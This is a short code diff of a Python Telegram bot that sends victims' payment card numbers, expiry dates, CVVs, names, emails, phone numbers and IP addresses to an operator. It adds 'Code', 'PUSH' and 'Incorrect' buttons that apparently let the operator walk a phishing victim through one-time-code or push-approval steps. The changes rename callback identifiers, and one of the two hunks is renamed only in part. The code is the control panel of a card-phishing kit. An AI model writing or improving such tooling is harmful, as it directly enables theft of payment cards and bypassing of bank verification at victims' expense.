@@ -17,11 +17,11 @@ def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
-            InlineKeyboardButton("📱Code📱", callback_data='button1'),
+            InlineKeyboardButton("📱Code📱", callback_data='button_code'),
         ],
         [
-            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
-            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
+            InlineKeyboardButton("📲PUSH📲", callback_data='button_push'),
+            InlineKeyboardButton("💳Incorrect💳", callback_data='button_incorrect_card'),
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -32,7 +32,7 @@ def send_me1(card, date, cvv, ID):
     bot = Bot(token=api)
     keyboard = [
         [
-            InlineKeyboardButton("📱Code📱", callback_data='button1'),
+            InlineKeyboardButton("📱Code📱", callback_data='button_code'),
         ],
         [
             InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
